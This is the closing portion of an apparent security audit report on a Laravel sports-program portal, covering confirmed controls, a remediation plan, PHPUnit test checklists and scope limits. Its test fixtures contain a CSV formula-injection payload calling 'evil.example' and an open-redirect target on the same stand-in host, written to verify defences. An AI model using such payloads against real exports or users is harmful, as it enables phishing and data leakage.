- Achievement certificate PDFs and application documents live on the **`private` disk** (`storage/app/private`) — never reachable via `public/storage` (`config/filesystems.php:41-46, 83-85`). Stored names are `Str::uuid()` (`AchievementController:217`, `CertificateRequestController:183`, `MedicalController:416`) or Laravel's random hash (`ApplicationController:142-144`).
- `SportController::studentMembers` exposes only name/student_id/grade/photo for **active members of the requested active sport** to authenticated students, and the member profile re-validates the athlete is an active member of that sport (`SportController:244-253`). No medical or emergency-contact data is exposed.

**Attendance check-in**
- Server-side enforcement is complete and atomic: `AttendanceSessionService::checkIn` (`:149-193`) wraps in `DB::transaction` with `lockForUpdate()` on the session and the record; enforces role = Student, status `Open`, not cancelled, `session_date` is today, and `effectiveSportId()` equals the athlete's sport. Double check-in returns `checkedIn=false`; a manual record (not `Pending`) is never overwritten. Correctly blocks check-in for another sport or a closed/cancelled session.

**Authentication / passwords / reset**
- Passwords hashed with bcrypt via the `hashed` cast (`User:276`), `password`/`remember_token` in `$hidden` (`User:19`); no password is logged anywhere (log lines contain only masked identifiers).
- Login regenerates the session on success (`routes:72`); logout invalidates the session **and** regenerates the CSRF token (`routes:115-121`); admin password reset regenerates the athlete's remember token (`AthleteController:172-176`); both password-change flows regenerate the session (`ChangePasswordController:68`, `ProfileController:129`).
- Admin-assisted temporary passwords use `random_int()` with all three character classes, 16 chars, then `str_shuffle` (`AthleteController:195-214`) — CSPRNG-backed. Returned once via a JSON response / flash, never stored in the page, session or log (the JS comment and controller agree), only the **hash** is persisted (`AdminAssistedPasswordResetTest` confirms).
- Password reset uses Laravel's broker: CSPRNG token, hashed in `password_reset_tokens`, single use, **60 min expiry** (`config/auth.php:99`), per-user resend throttle 60 s (`:100`), plus `throttle:5,1` per IP on both POST endpoints (`routes:105-113`). `showResetForm` validates the token before rendering. Generic response message shared by registered and unknown addresses (`PasswordResetController:24`) — no enumeration on that endpoint.
- Reset links are built with `url(route(..., absolute:false))` → based on `APP_URL`, **not** the `Host` header (verified in `vendor/.../ResetPassword.php:96-100`). No host-header poisoning of reset links. No `Password::createUrlUsing` overrides.
- **Forced password change** requires the current (temporary) password and a different new password (`ChangePasswordController:35-42`), then clears `must_change_password` and regenerates the session. (Scope gap is F-06.)
- `APP_DEBUG=false`, `APP_ENV=production` in `.env`; `.env` and `database/*.sqlite` are **not tracked** by git (`git ls-files` clean; `git log` on those paths empty); no secrets were found in git history.
- `composer.json` has no pre/post-install arbitrary scripts beyond `package:discover`, `vendor:publish`, `key:generate`, `migrate` — nothing that executes untrusted code.

**Injection / output**
- **SQL injection:** all user-influenced SQL goes through the query builder. The only raw fragments are constants: `selectRaw('achievement_type, COUNT(*) …')`, `selectRaw('user_id, status, COUNT(*) …')`, `whereRaw('LOWER(venue) = ?', [bound])`, `whereRaw('1 = 1')`. No `orderBy`/column name is taken from the request (sort is whitelisted in `AchievementController:246`). `LIKE` searches pass the term as a bind parameter.
- **XSS:** every user-controlled value is escaped with `{{ }}`. `{!! !!}` appears only for pre-escaped composites (`applications/show.blade.php:57` `$heroMeta`, `applications/index.blade.php:117` `$applicantMeta` — both built with `e()` on each field) and for static attributes via `$linked()` in `events/_attendance-fields.blade.php`; the `vendor/mail` and `vendor/notifications` `{!! !!}` are Laravel's own templates over escaped Markdown output. No `innerHTML` with server data in `public/js` (`password-reset.js:30-34` is an escaping helper used with `textContent`).
- **CSRF:** the default `web` group is intact — `bootstrap/app.php` removes nothing from `ValidateCsrfToken`; every form reviewed carries `@csrf`, all state changes are POST/PATCH/PUT/DELETE (no state-changing GET found).
- **Open redirect:** none in controllers (`back()`, named routes and `redirect()->to($previous)` where `$previous` is normalised to a known route, `AthleteController:247-256`). Notification redirect is the only sink (F-07).
- **PDF injection:** certificate and report templates render escaped database values; DomPDF has `enable_remote=false`, `enable_php=false`, and `chroot` limited to the project root.

**File uploads**
- Application documents: `['required','file','mimes:pdf,jpg,jpeg,png','max:5120']` (`ApplicationController:133-135`); Laravel's `mimes` rule validates the **detected** MIME/extension, blocking `.php`, `.svg`, `.html` and double extensions.
- Medical certificates: `file|mimes:<config>|max:<config>` (`MedicalController:388`, `config/medical.php`).
- Profile photos / coach photos / sport logos: `image|mimes:jpg,jpeg,png,webp|max:2048` (`HandlesProfilePhotos:30`, `CoachController:120`, `SportController:343`). Stored on the public disk under random names (acceptable — these are non-sensitive public avatars); replacements delete the old file with a path prefix guard.

**PWA**
- `manifest.webmanifest` contains no secrets. `localStorage` is used only for theme/sidebar preferences and `sessionStorage` for scroll position (`portal-ui.js`); no tokens or PII. `sw.js` is not intercepting non-GET and excludes private routes.

**Logging**
- Failed login is logged with a masked identifier in `logAttempt()` (the unmasked copy is the separate log path in F-05). Tokens and passwords do not appear in logs.

**Tests**
- `php artisan test`: **335 passed, 2 failed** (both from the deleted auth views, F-14). Existing suite already covers many 403 role checks and IDOR attempts, e.g. `MedicalRecordsTest`, `AchievementsTest`, `CertificateIssuanceTest`, `AttendanceSessionTest`, `ReportsManagementTest`, `AdminAssistedPasswordResetTest`. This materially raises confidence in the authorization results above.

---

## 5. Prioritised remediation plan

### Fix this week (before the defence / any deployment) — ~1 working day total
| Item | Effort | Verify with |
|---|---|---|
| **F-01** `composer update` the six packages, re-run `composer audit` + tests | 1 h | `composer audit` clean, suite green |
| **F-02** disable `DatabaseSeeder` outside local/testing; **rotate every seeded/demo password**; verify no `admin@example.com` / `password` account in prod | 1 h | new test asserting seeder no-ops in production |
| **F-03** add `throttle:login` to `POST /login` (5/min per identifier+IP, 20/min per IP) | 1 h | `AuthenticationTest` throttling case → 429 |
| **F-04 + F-05** stop warning admins for unknown identifiers; mask identifiers in emails and logs; truncate `laravel.log` | 2 h | test: unknown identifier ⇒ no notification; log line contains `***@` |
| **F-14** restore the two deleted auth views; suite must be fully green | 15 min | `php artisan test` → 0 failures |
| **F-08** add `sanitizeCsvCell()` to `ReportController::export` | 30 min | test exporting a name starting with `=` |
| **F-10 (partial)** `SESSION_SECURE_COOKIE=true` + `APP_URL=https://…` + `forceScheme('https')` once HTTPS is in place | 1 h (with cert) | browser DevTools ⇒ cookie `Secure` |

### Before the defence / final deployment — ~1.5 days
| Item | Effort |
|---|---|
| **F-06** apply `force.password.change` globally via `appendToGroup('web', …)` | 1 h |
| **F-07** allowlist notification redirect targets | 30 min |
| **F-09** throttle `/apply` and add upload quotas/cleanup | 1 h |
| **F-11** security-header middleware incl. CSP; deploy with `public/` as doc root | 2 h |
| **F-15** stronger password rule + `password.confirm` on sensitive admin actions | 3 h |
| **F-16** remember-me lifetime 14 days, hide for students | 30 min |
| **F-17** clear runtime cache on logout; public-only navigation cache allowlist | 2 h |
| **F-13** tighten DomPDF `allowed_protocols`, `enable_javascript=false`, `chroot=public_path()` | 30 min |
| Full manual IDOR/role matrix run on staging (see §6) | 4 h |

### Later / continuous
- **F-18** append-only `audit_logs` for approvals, medical edits, certificate issuance and sensitive document views (~2 days).
- **F-12** shrink `User::$fillable`, use `forceFill` for privileged columns (~2 h).
- Dependency hygiene: `composer audit` + `npm audit` in a scheduled/CI check; generate `package-lock.json` (none exists today, so `npm audit` cannot run).
- Backup & retention policy for `storage/app/private` (encrypt backups, restrict access).
- Add a `RateLimiter` dashboard/alerts on `429` volume.

---

## 6. Test checklist (PHPUnit feature tests + manual)

Add these to `tests/Feature`. Use `User::factory()` with explicit `role` and `withMiddleware(ValidateCsrfToken::class)` disabled only where the existing suite already does.

### Role escalation
```php
public function test_a_student_cannot_reach_any_admin_route(): void
{
    $student = User::factory()->create(['role' => 'Student']);
    $adminRoutes = ['dashboard','admin.calendar','admin.applications','athletes.index',
                    'sports.index','coaches.index','events.index','admin.medical',
                    'admin.achievements','admin.certificate-requests','admin.attendance','reports.index'];
    foreach ($adminRoutes as $name) {
        $this->actingAs($student)->get(route($name))->assertForbidden();
    }
}

public function test_profile_update_cannot_promote_a_student(): void
{
    $s = User::factory()->create(['role' => 'Student']);
    $this->actingAs($s)->patch(route('student.profile.update'), [
        'name' => 'S', 'email' => $s->email, 'role' => 'Administrator', 'status' => 'Inactive',
    ])->assertRedirect();
    $this->assertSame('Student', $s->fresh()->role);
    $this->assertSame('Active', $s->fresh()->status);
}
```

### IDOR (repeat per object)
```php
public function test_student_cannot_read_or_change_another_students_records(): void
{
    [$a, $b] = User::factory()->count(2)->create(['role' => 'Student']);
    $record  = MedicalRecord::factory()->create(['athlete_id' => $b->id]);
    $ach     = Achievement::factory()->create(['athlete_id' => $b->id]);
    $request = CertificateRequest::factory()->create(['student_id' => $b->id, 'achievement_id' => $ach->id]);

    $this->actingAs($a)->get(route('student.achievements.show', $ach))->assertNotFound();
    $this->actingAs($a)->get(route('student.achievements.certificate', $ach))->assertNotFound();
    $this->actingAs($a)->post(route('student.achievements.certificate-request', $ach))->assertNotFound();
    $this->actingAs($a)->get(route('student.sports.member-profile', [$sport, $b]))->assertNotFound();
    $this->actingAs($a)->get(route('admin.medical.show', $record))->assertForbidden();
    // notifications
    $b->notify(new StudentUpdateNotification('t','m'));
    foreach ($b->notifications as $n) {
        $this->actingAs($a)->get(route('notifications.open', $n->id))->assertNotFound();
        $this->actingAs($a)->post(route('notifications.read', $n->id))->assertNotFound();
    }
}
```

### Authentication hardening
```php
public function test_login_is_rate_limited(): void
{
    $u = User::factory()->create(['role' => 'Student', 'username' => 'athlete1']);
    for ($i = 0; $i < 5; $i++) {
        $this->post(route('login.submit'), ['username'=>'athlete1','password'=>'wrong','role'=>'Student']);
    }
    $this->post(route('login.submit'), ['username'=>'athlete1','password'=>'wrong','role'=>'Student'])
         ->assertStatus(429);
}

public function test_unknown_identifier_does_not_notify_administrators(): void
{
    Notification::fake();
    $this->post(route('login.submit'), ['username'=>'nobody@example.com','password'=>'x','role'=>'Student']);
    Notification::assertNothingSent();
}

public function test_identifier_is_masked_in_logs(): void
{
    Log::spy();
    $this->post(route('login.submit'), ['username'=>'juan@example.com','password'=>'x','role'=>'Student']);
    Log::shouldHaveReceived('warning')->withArgs(fn ($m) => ! str_contains($m, 'juan@example.com'));
}
```

### Forced password change integrity
```php
public function test_forced_change_account_cannot_use_other_routes(): void
{
    $s = User::factory()->create(['role'=>'Student','must_change_password'=>true]);
    $this->actingAs($s)->get(route('notifications.index'))->assertRedirect(route('student.change-password'));
    $this->actingAs($s)->get(route('student.dashboard'))->assertRedirect(route('student.change-password'));
    $this->actingAs($s)->get(route('student.change-password'))->assertOk();
}
```

### CSV and redirects
```php
public function test_report_export_neutralises_formula_cells(): void
{
    User::factory()->create(['role'=>'Student','name'=>'=HYPERLINK("http://evil.example","x")']);
    $csv = $this->actingAs(User::factory()->create(['role'=>'Administrator']))
        ->get(route('reports.export', ['format'=>'csv','report'=>'athletes']))
        ->streamedContent();
    $this->assertStringNotContainsString(',=HYPERLINK', $csv);
}

public function test_notification_redirect_is_same_origin_only(): void
{
    $u = User::factory()->create(['role'=>'Student']);
    DB::table('notifications')->insert([ /* user id, data = {"url":"https://evil.example"} */ ]);
    $this->actingAs($u)->get(route('notifications.open', $id))
         ->assertRedirect(route('notifications.index'));
}
```

### Manual checks (staging)
1. Sign in as a student; hit every `/admin/*` GET/POST/PUT/DELETE with curl and confirm `403`.
2. Change a certificate / medical / document id in the URL by ±1 and confirm `404`/`403`.
3. Confirm `curl -I https://host/login` shows `Secure; HttpOnly; SameSite=Lax` and a CSP header.
4. DevTools ▸ Application ▸ Cache Storage after visiting `/student/*` and downloading a certificate — confirm nothing private is cached; logout and confirm.
5. Confirm `GET /forgot-password` and the forced-change page render (F-14).
6. Confirm no `admin@example.com` / default-password account exists in the production DB.

---

## 7. Out of scope / limitations

- **Read-only static review + safe local tooling.** `composer audit` was run against the locked versions; **`npm audit` could not run** because the repository has **no `package-lock.json`** and `node_modules` is absent — front-end dependency risk is therefore not assessed. Generate a lockfile and audit before deployment.
- `php artisan test` was executed against the **in-memory SQLite** database declared in `phpunit.xml`; no real data was touched. Two failures are pre-existing and explained in F-14.
- No live server, browser or load testing was performed. Items labelled **Needs runtime check** (F-01 ReDoS practicality, F-07 exploitability, F-09 disk quota, F-17 cache contents) must be validated on staging.
- No external network scanning, no dependency installation, no `migrate`, `db:seed`, `git commit`, config change or file deletion was performed. The only file created is this report.
- Not assessed: physical security of the coordinator workstation, XAMPP/Apache/PHP/MySQL server hardening, OS patching, SMTP provider security, backup storage security, network segmentation, and the correctness of the *business* rules (e.g. whether a coordinator should see all medical records at all).
- I did not review the contents of `vendor/` for logic beyond confirming the reset-link construction; third-party code is covered only through `composer audit`.
- The working tree contains uncommitted modifications and deletions (`git status`); findings refer to the **current working tree**, not to `HEAD`.
- “Info” items are observations, not vulnerabilities.

---

*End of report.*
